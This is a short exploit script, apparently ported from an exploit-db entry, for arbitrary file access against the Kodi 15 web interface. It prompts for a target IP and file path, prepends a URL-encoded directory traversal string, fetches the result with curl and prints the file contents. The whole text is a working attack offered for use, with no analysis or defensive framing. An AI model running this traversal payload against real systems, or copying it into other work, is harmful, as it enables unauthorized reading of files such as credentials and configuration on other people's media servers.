/**
* Title: Kodi 15 - Arbitrary File Access (Web Interface)
* Discovered by: Machiel Pronk
* Exploit from https://www.exploit-db.com/exploits/38833/
*/

load "http/curl"

print "Kodi 15 Arbitrary File Access (Web Interface)\n"

print "IP Target: "
input.start()
    @target = input.value
input.close()

print "File/Path: "
input.start()
    @file = input.value
    @exploit = "/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..".@file
    @result = curl.get(@target, @exploit)
    print @result
input.close()